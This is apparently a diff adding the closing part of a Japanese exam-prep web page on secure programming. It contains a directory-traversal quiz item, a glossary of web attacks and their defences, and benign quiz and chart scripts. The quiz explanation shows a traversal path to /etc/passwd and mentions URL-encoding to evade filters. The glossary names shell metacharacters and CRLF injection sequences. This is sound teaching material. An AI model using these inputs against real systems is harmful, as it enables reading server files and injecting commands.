+<button class="quiz-opt" onclick="answer('q7','b','b')">イ. ファイルシステムにおける親ディレクトリへの参照であり、Webルートの外側にあるファイルへのアクセスに悪用される。</button>
+<button class="quiz-opt" onclick="answer('q7','c','b')">ウ. HTTPヘッダを分割する改行コードである。</button>
+<button class="quiz-opt" onclick="answer('q7','d','b')">エ. シェルのパイプ記号でコマンドをつなげる。</button>
+</div>
+<div class="quiz-exp" id="q7-exp"><strong>正解：イ</strong><br><code>../</code>はOSのファイルシステムにおいて「1階層上（親ディレクトリ）」を指す。ディレクトリトラバーサルでは<code>../../../../etc/passwd</code>のように繰り返し使うことでWebルート（/var/www/html）の外にある機密ファイルにアクセスする。URLエンコード（<code>%2F</code>=<code>/</code>、<code>%2E</code>=<code>.</code>）を使ったフィルタ迂回も要注意。</div>
+</div>
+
+</div><!-- /quiz-wrap -->
+</section>
+
+<!-- ================================================================ S14 用語まとめ ================================================================ -->
+<section class="section" id="s14">
+<div class="section-header"><span class="s-num">14</span><h2>重要用語まとめ</h2></div>
+
+<table class="term-table">
+<tr><td>XSS（Reflected）</td><td>反射型XSS。URLパラメータにスクリプトを埋め込みその場限りで実行させる。フィッシングメールと組み合わせることが多い。</td></tr>
+<tr><td>XSS（Stored）</td><td>蓄積型XSS。スクリプトをDBに保存しページの全訪問者に実行させる。最も危険なXSS。</td></tr>
+<tr><td>XSS（DOM-based）</td><td>DOMベース型XSS。サーバを経由せずクライアント側JSがDOMを操作する際に発生。サーバログに痕跡が残りにくい。</td></tr>
+<tr><td>HTMLエスケープ</td><td>XSS対策。&lt;を&amp;lt;、&gt;を&amp;gt;等に変換してHTMLタグとして解釈させない。出力時の適用が重要。</td></tr>
+<tr><td>Content Security Policy（CSP）</td><td>HTTPヘッダで許可するスクリプト発生源を制限するXSS・クリックジャッキング対策。<code>script-src 'self'</code>等で外部スクリプトを禁止。</td></tr>
+<tr><td>SQLインジェクション</td><td>入力値にSQL文を混入してDBを不正操作する攻撃。情報漏洩・認証バイパス・データ削除が主な被害。</td></tr>
+<tr><td>プリペアドステートメント</td><td>SQL文の構造とデータを分離して実行する仕組み。SQLiの根本対策。バインドパラメータとも呼ぶ。</td></tr>
+<tr><td>バッファオーバーフロー</td><td>確保したバッファを超えてデータを書き込みリターンアドレスを上書きし任意コードを実行させる攻撃。C/C++で多発。</td></tr>
+<tr><td>ASLR</td><td>Address Space Layout Randomization。メモリ配置をランダム化しBOF攻撃者のアドレス予測を困難にするOS保護機構。</td></tr>
+<tr><td>DEP/NX</td><td>Data Execution Prevention / No-Execute。データ領域を実行不可にしシェルコードの実行を防ぐBOF対策。</td></tr>
+<tr><td>スタックカナリア</td><td>バッファとリターンアドレスの間に番犬値を配置し書き換えを検出するBOF対策。コンパイラが自動挿入。</td></tr>
+<tr><td>CSRF</td><td>Cross-Site Request Forgery。ログイン中ユーザのブラウザ（クライアント側）から正規サービスへ意図しないリクエストを送信させる攻撃。</td></tr>
+<tr><td>CSRFトークン</td><td>フォームに埋め込むランダムなトークン。サーバがリクエスト時に検証することでCSRFを防ぐ根本対策。</td></tr>
+<tr><td>SameSite属性</td><td>CookieのクロスサイトリクエストでのCookie送信を制御する属性。Strict/Lax/NoneでCSRF対策に使用。</td></tr>
+<tr><td>SSRF</td><td>Server-Side Request Forgery。WebアプリをプロキシにしてサーバからFW内の内部サービスへリクエストを発行させる攻撃。クラウドメタデータ窃取が特に危険。</td></tr>
+<tr><td>セッションハイジャック</td><td>認証後のセッションIDを盗んでアカウントを乗っ取る攻撃。HttpOnly・Secure Cookie・HTTPSが対策。</td></tr>
+<tr><td>セッションフィクセーション</td><td>ログイン前にセッションIDを固定させ認証後にそのIDを使って乗っ取る攻撃。ログイン時のセッションID再生成が根本対策。</td></tr>
+<tr><td>HttpOnly属性</td><td>JavaScriptからのCookie読み取りを禁止するCookie属性。XSS経由のCookie窃取を防ぐ。</td></tr>
+<tr><td>ディレクトリトラバーサル</td><td>「../」でWebルート外のファイルにアクセスする攻撃。realpath()による正規化・間接参照が対策。</td></tr>
+<tr><td>OSコマンドインジェクション</td><td>シェル特殊文字（;|&amp;&amp;`等）でOSコマンドを追加注入しサーバを制御する攻撃。OSコマンド不使用・引数分離が対策。</td></tr>
+<tr><td>クリックジャッキング</td><td>透明iframeで正規サイトを覆いユーザのクリックを横取りする攻撃。X-Frame-Options・CSP frame-ancestorsが対策。</td></tr>
+<tr><td>X-Frame-Options</td><td>HTTPレスポンスヘッダ。DENY/SAMEORIGINでiframeへの埋め込みを制御するクリックジャッキング対策。</td></tr>
+<tr><td>HTTPヘッダインジェクション</td><td>CRLF（\r\n）をHTTPレスポンスヘッダに注入し任意のヘッダ追加・レスポンス分割を行う攻撃。</td></tr>
+<tr><td>CRLF</td><td>Carriage Return（\r）+ Line Feed（\n）。HTTPヘッダとメールヘッダの区切り。%0d%0aとしてURLエンコードされインジェクション攻撃に悪用される。</td></tr>
+<tr><td>メールヘッダインジェクション</td><td>メール送信フォームにCRLFを注入しBcc等のヘッダを追加しスパム踏み台にする攻撃。CRLF除去・固定値使用が対策。</td></tr>
+</table>
+</section>
+
+</main>
+</div>
+<footer>
+<p>セキュアプログラミング — Webアプリ攻撃と対策 技術解説書 Ver.2 — 情報処理安全確保支援士試験 対応版</p>
+<p>シラバス Ver.2.1 | 2-5 セキュアプログラミング / 2-6 セキュリティテスト / 3-5 ネットワーク及び機器のセキュリティ管理</p>
+</footer>
+
+<script>
+/* ---- Navigation ---- */
+function setActive(el){document.querySelectorAll('.sidebar nav a').forEach(a=>a.classList.remove('active'));el.classList.add('active')}
+const sections=document.querySelectorAll('section.section');
+const navLinks=document.querySelectorAll('.sidebar nav a');
+window.addEventListener('scroll',()=>{
+  let current='';
+  sections.forEach(sec=>{if(window.scrollY>=sec.offsetTop-80)current=sec.id});
+  navLinks.forEach(link=>{link.classList.toggle('active',link.getAttribute('href')==='#'+current)});
+},{passive:true});
+
+/* ---- Quiz ---- */
+function answer(qid,selected,correct){
+  const quiz=document.getElementById(qid);
+  const opts=quiz.querySelectorAll('.quiz-opt');
+  const exp=document.getElementById(qid+'-exp');
+  const letters=['a','b','c','d'];
+  opts.forEach((btn,i)=>{btn.disabled=true;const l=letters[i];if(l===correct){btn.classList.add('correct')}else if(l===selected){btn.classList.add('wrong')}else{btn.classList.add('reveal')}});
+  exp.classList.add('show');
+  exp.scrollIntoView({behavior:'smooth',block:'nearest'});
+}
+
+/* ---- Tab switching ---- */
+function switchTab(id){
+  document.querySelectorAll('.mtab').forEach((t,i)=>{
+    const panels=['tab-target','tab-method','tab-victim','tab-danger','tab-defense'];
+    t.classList.toggle('active',panels[i]===id);
+  });
+  document.querySelectorAll('.mpanel').forEach(p=>{p.classList.toggle('active',p.id===id)});
+}
+
+/* ---- Accordion cards ---- */
+function toggleCard(id){
+  const body=document.getElementById(id+'-body');
+  const chev=document.getElementById(id+'-chev');
+  const isOpen=body.classList.contains('open');
+  body.classList.toggle('open',!isOpen);
+  chev.classList.toggle('open',!isOpen);
+}
+
+/* ---- Danger chart ---- */
+const attacks=[
+  {name:'蓄積型XSS',   danger:5,atk:3,detect:4,color:'#a020a0'},
+  {name:'SQLi',        danger:5,atk:3,detect:3,color:'#7a1818'},
+  {name:'OSコマンドi', danger:5,atk:3,detect:3,color:'#7a1818'},
+  {name:'BOF',         danger:5,atk:4,detect:5,color:'#7a4208'},
+  {name:'SSRF',        danger:4,atk:3,detect:4,color:'#5a1a9e'},
+  {name:'反射型XSS',   danger:3,atk:2,detect:3,color:'#1a56cc'},
+  {name:'CSRF',        danger:3,atk:2,detect:3,color:'#1a56cc'},
+  {name:'セッションHJ',danger:4,atk:3,detect:4,color:'#7a1818'},
+  {name:'Dir.Tra.',    danger:3,atk:2,detect:3,color:'#7a4208'},
+  {name:'クリックJK',  danger:2,atk:2,detect:3,color:'#155f44'},
+  {name:'HTTPヘッダi', danger:3,atk:2,detect:3,color:'#155f44'},
+  {name:'メールヘッダi',danger:2,atk:2,detect:2,color:'#155f44'},
+];
+
+/* Build danger table */
+(function buildDangerTable(){
+  const tbody=document.getElementById('danger-tbody');
+  if(!tbody)return;
+  const starFn=(n,color)=>{
+    let s='';
+    for(let i=1;i<=5;i++){
+      s+=`<span style="color:${i<=n?color:'#ddd'};font-size:14px">&#9632;</span>`;
+    }
+    return s;
+  };
+  attacks.forEach(a=>{
+    const tr=document.createElement('tr');
+    tr.style.borderBottom='1px solid var(--line)';
+    tr.innerHTML=`
+      <td style="padding:8px 12px;font-weight:700;color:${a.color}">${a.name}</td>
+      <td style="padding:8px 12px;text-align:center">${starFn(a.danger,'#7a1818')}</td>
+      <td style="padding:8px 12px;text-align:center">${starFn(a.atk,'#b5821e')}</td>
+      <td style="padding:8px 12px;text-align:center">${starFn(a.detect,'#5a1a9e')}</td>
+      <td style="padding:8px 12px;font-size:11.5px;color:#3a3d52">${a.memo||''}</td>
+    `;
+    tbody.appendChild(tr);
+  });
+  // Add memos
+  const memos=['掲示板ワーム・決済キーロガー等の大規模被害','個人情報DB漏洩・認証バイパス','サーバ完全制御・バックドア設置','任意コード実行・権限昇格','クラウドIAM窃取・内部API不正アクセス','フィッシングメール経由のCookie窃取','不正送金・パスワード変更','Cookie盗聴・XSS経由のセッション乗っ取り','設定ファイル・ソースコード漏洩','意図しないSNS投稿・送金承認','Cookie書き換え・キャッシュポイズニング','スパム踏み台・送信ドメインのBL入り'];
+  tbody.querySelectorAll('tr').forEach((tr,i)=>{
+    if(memos[i]) tr.querySelector('td:last-child').textContent=memos[i];
+  });
+})();
+
+/* Build horizontal bar chart */
+(function buildBarChart(){
+  const container=document.getElementById('bar-chart');
+  if(!container)return;
+  const metrics=[
+    {key:'danger',label:'危険度',color:'#7a1818'},
+    {key:'atk',label:'攻撃難易度（低=易）',color:'#b5821e'},
+    {key:'detect',label:'発見難易度（高=困難）',color:'#5a1a9e'},
+  ];
+  const BAR_W=60; // width per 1 score
+  const ROW_H=28;
+  const LABEL_W=110;
+  const PADDING=12;
+  const TOTAL_W=LABEL_W+5*BAR_W+PADDING*2;
+  
+  let html=`<div style="min-width:${TOTAL_W}px">`;
+  // legend
+  html+=`<div style="display:flex;gap:16px;margin-bottom:12px;flex-wrap:wrap">`;
+  metrics.forEach(m=>{
+    html+=`<div style="display:flex;align-items:center;gap:5px"><div style="width:14px;height:14px;background:${m.color};border-radius:2px;opacity:.8"></div><span style="font-size:11px;color:#555">${m.label}</span></div>`;
+  });
+  html+=`</div>`;
+  
+  // chart
+  html+=`<div style="position:relative">`;
+  // gridlines
+  for(let g=1;g<=5;g++){
+    html+=`<div style="position:absolute;top:0;bottom:0;left:${LABEL_W+PADDING+(g-1)*BAR_W}px;width:1px;background:#eee"></div>`;
+    html+=`<div style="position:absolute;top:-18px;left:${LABEL_W+PADDING+(g-1)*BAR_W}px;font-size:9.5px;color:#aaa;font-family:var(--mono)">${g}</div>`;
+  }
+  
+  attacks.forEach((a,ai)=>{
+    const yTop=ai*(ROW_H*3+8)+20;
+    html+=`<div style="position:relative;margin-bottom:8px;padding-bottom:0">`;
+    html+=`<div style="position:absolute;left:0;top:${ROW_H+2}px;width:${LABEL_W}px;font-size:10.5px;font-weight:700;color:${a.color};white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${a.name}</div>`;
+    metrics.forEach((m,mi)=>{
+      const val=a[m.key];
+      const barW=val*BAR_W;
+      html+=`<div style="display:flex;align-items:center;height:${ROW_H}px;margin-bottom:2px">`;
+      html+=`<div style="flex:0 0 ${LABEL_W}px"></div>`;
+      html+=`<div style="flex:1;padding-left:${PADDING}px">`;
+      html+=`<div style="background:${m.color};opacity:0.75;height:14px;width:${barW}px;border-radius:0 4px 4px 0;display:flex;align-items:center;min-width:4px;transition:width 0.3s"></div>`;
+      html+=`</div>`;
+      html+=`</div>`;
+    });
+    html+=`</div>`;
+  });
+  
+  html+=`</div></div>`;
+  container.innerHTML=html;
+  
+  // Rebuild as proper bar chart
+  container.innerHTML='';
+  const wrap=document.createElement('div');
+  wrap.style.cssText='overflow-x:auto;';
+  
+  // Legend
+  const leg=document.createElement('div');
+  leg.style.cssText='display:flex;gap:16px;margin-bottom:12px;flex-wrap:wrap;';
+  metrics.forEach(m=>{
+    const d=document.createElement('div');
+    d.style.cssText='display:flex;align-items:center;gap:5px;';
+    d.innerHTML=`<div style="width:12px;height:12px;background:${m.color};border-radius:2px;"></div><span style="font-size:11px;color:#555">${m.label}</span>`;
+    leg.appendChild(d);
+  });
+  wrap.appendChild(leg);
+  
+  // Grid labels
+  const glabelRow=document.createElement('div');
+  glabelRow.style.cssText=`display:flex;padding-left:${LABEL_W}px;margin-bottom:2px;`;
+  for(let g=1;g<=5;g++){
+    const gl=document.createElement('div');
+    gl.style.cssText=`flex:0 0 ${BAR_W}px;text-align:left;font-size:9.5px;color:#aaa;font-family:var(--mono);`;
+    gl.textContent=g;
+    glabelRow.appendChild(gl);
+  }
+  wrap.appendChild(glabelRow);
+  
+  attacks.forEach(a=>{
+    const row=document.createElement('div');
+    row.style.cssText='display:flex;flex-direction:column;margin-bottom:10px;';
+    // Name
+    const nameDiv=document.createElement('div');
+    nameDiv.style.cssText=`font-size:11px;font-weight:700;color:${a.color};margin-bottom:3px;width:${LABEL_W}px;`;
+    nameDiv.textContent=a.name;
+    row.appendChild(nameDiv);
+    
+    metrics.forEach(m=>{
+      const barRow=document.createElement('div');
+      barRow.style.cssText='display:flex;align-items:center;height:16px;margin-bottom:2px;';
+      
+      const labelDiv=document.createElement('div');
+      labelDiv.style.cssText=`flex:0 0 ${LABEL_W}px;font-size:9px;color:#888;`;
+      labelDiv.textContent=m.label.length>8?m.label.slice(0,8)+'…':m.label;
+      barRow.appendChild(labelDiv);
+      
+      const barOuter=document.createElement('div');
+      barOuter.style.cssText=`display:flex;align-items:center;height:12px;`;
+      for(let i=1;i<=5;i++){
+        const seg=document.createElement('div');
+        seg.style.cssText=`width:${BAR_W-2}px;height:10px;margin-right:2px;border-radius:3px;background:${i<=a[m.key]?m.color:'#eee'};`;
+        barOuter.appendChild(seg);
+      }
+      barRow.appendChild(barOuter);
+      row.appendChild(barRow);
+    });
+    wrap.appendChild(row);
+  });
+  container.appendChild(wrap);
+})();
+</script>
+</body>
+</html>
